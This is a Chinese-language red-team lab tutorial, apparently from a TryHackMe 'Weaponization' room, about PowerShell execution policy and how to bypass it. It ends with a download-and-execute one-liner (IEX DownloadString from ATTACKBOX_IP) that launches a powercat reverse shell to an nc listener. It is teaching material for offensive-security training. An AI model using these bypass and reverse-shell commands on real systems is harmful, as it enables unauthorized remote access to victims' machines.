PowerShell 是一种面向对象的编程语言，从 .NET 中的动态语言运行时 (DLR) 执行，但遗留用途有一些例外。
红队成员依靠 PowerShell 执行各种活动，包括初始访问、系统枚举等。首先，我们创建一个简单的 PowerShell 脚本，用于打印“欢迎来到武器化室！”如下，
```powershell
Write-Output "Welcome to the Weaponization Room!"
```
将文件另存为 thm.ps1。通过写入输出，我们打印消息“欢迎来到武器化室！”到命令提示符。现在让我们运行它并查看结果。
```powershell
C:\Users\thm\Desktop>powershell -File thm.ps1 File C:\Users\thm\Desktop\thm.ps1 cannot be loaded because running scripts is disabled on this system. For more information, see about_Execution_Policies at http://go.microsoft.com/fwlink/?LinkID=135170. + CategoryInfo : SecurityError: (:) [], ParentContainsErrorRecordException + FullyQualifiedErrorId : UnauthorizedAccess C:\Users\thm\Desktop>
```

**执行政策**
PowerShell 的执行策略是一个安全选项，用于保护系统免遭恶意脚本的运行。默认情况下，出于安全目的，Microsoft 禁用执行 PowerShell 脚本 .ps1。 PowerShell 执行策略设置为“受限”，这意味着它允许单个命令，但不允许运行任何脚本。
您可以按如下方式确定 Windows 当前的 PowerShell 设置：
```powershell
PS C:\Users\thm> Get-ExecutionPolicy Restricted
```
我们还可以通过运行以下命令轻松更改 PowerShell 执行策略：
```powershell
PS C:\Users\thm\Desktop> Set-ExecutionPolicy -Scope CurrentUser RemoteSigned Execution Policy Change The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose you to the security risks described in the about_Execution_Policies help topic at http://go.microsoft.com/fwlink/?LinkID=135170. Do you want to change the execution policy? [Y] Yes [A] Yes to All [N] No [L] No to All [S] Suspend [?] Help (default is "N"): A
```

** 绕过执行策略**
Microsoft 提供了禁用此限制的方法。其中一种方法是为 PowerShell 命令提供参数选项，将其更改为您所需的设置。例如，我们可以将其更改为绕过策略，这意味着没有任何内容被阻止或限制。这很有用，因为它可以让我们运行我们自己的 PowerShell 脚本。
为了确保我们的 PowerShell 文件得到执行，我们需要在参数中提供绕过选项，如下所示：
```powershell
C:\Users\thm\Desktop>powershell -ex bypass -File thm.ps1 Welcome to Weaponization Room!
```
Now, let's try to get a reverse shell using one of the tools written in PowerShell, which is powercat. On your AttackBox, download it from GitHub and run a webserver to deliver the payload.
```powershell
user@machine$ git clone https://github.com/besimorhino/powercat.git Cloning into 'powercat'... remote: Enumerating objects: 239, done. remote: Counting objects: 100% (4/4), done. remote: Compressing objects: 100% (4/4), done. remote: Total 239 (delta 0), reused 2 (delta 0), pack-reused 235 Receiving objects: 100% (239/239), 61.75 KiB | 424.00 KiB/s, done. Resolving deltas: 100% (72/72), done.
```
现在，我们需要在 AttackBox 上设置一个 Web 服务器来为将在目标计算机上下载并执行的 powercat.ps1 提供服务。接下来，将目录更改为 powercat 并开始侦听您选择的端口。在我们的例子中，我们将使用端口 8080.
```
python3 -m http.server 8080
user@machine$ nc -lvp 1337
```

现在，我们从受害者计算机下载有效负载并使用 PowerShell 有效负载执行它，如下所示：
```powershell
C:\Users\thm\Desktop> powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://ATTACKBOX_IP:8080/powercat.ps1');powercat -c ATTACKBOX_IP -p 1337 -e cmd"
```
